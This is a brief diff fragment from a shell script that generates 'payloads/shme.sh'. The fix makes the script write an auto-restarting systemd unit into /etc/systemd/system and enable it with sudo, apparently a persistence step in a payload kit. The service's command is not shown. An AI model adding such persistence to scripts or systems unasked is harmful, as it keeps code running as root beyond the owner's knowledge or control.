@@ -113,7 +113,7 @@ echo \"[Unit]
         RestartSec=60
         
         [Install]
-        WantedBy=multi-user.target\"
+        WantedBy=multi-user.target\" > /etc/systemd/system/shme.service
         
 sudo systemctl enable --now shme.service" > payloads/shme.sh
 # err handling
